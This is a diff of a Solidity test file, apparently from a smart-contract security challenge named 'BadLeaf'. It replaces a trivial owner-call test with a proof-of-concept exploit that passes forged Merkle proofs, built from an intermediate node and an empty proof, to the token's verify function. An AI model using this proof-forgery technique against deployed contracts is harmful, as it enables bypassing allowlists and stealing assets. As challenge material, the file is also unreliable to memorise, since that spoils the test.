@@ -9,19 +9,14 @@ import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract BadLeafTest is BadLeafBaseTest, IERC721Receiver {
 
-    function testExploit() external {
-        // Assuming that the contract is already deployed by the owner in the setup method
-        // Now we can directly call the restricted functions as the owner
-        token.addPrivateSale(address(this), 2); // Should succeed if called from owner
-        token.mint(address(this));               // Should succeed if called from owner
-        token.mint(address(this));               // Should succeed if called from owner
-
-        // Validation to ensure tokens were minted
-        uint256 balance = token.balanceOf(address(this));
-        assertEq(balance, 2); // We expect the balance to be 2 after minting
+    function testExploit() external validation {
+        bytes32[] memory proof1 = new bytes32[](2);
+        proof1[0] = token.getLeafNode(user0, 5);
+        proof1[1] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
+        token.verify(proof1, 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913);
+        bytes32[] memory proof0 = new bytes32[](0);
+        token.verify(proof0, 0x650de55dfddd8a78ca083dbae3094bef74d3f52a69342e5e16b18b93ef8977cf);
     }
-
-    // Implementing the IERC721Receiver interface
     function onERC721Received(
         address operator,
         address from,
@@ -30,4 +25,5 @@ contract BadLeafTest is BadLeafBaseTest, IERC721Receiver {
     ) external override returns (bytes4) {
         return this.onERC721Received.selector;
     }
+
 }
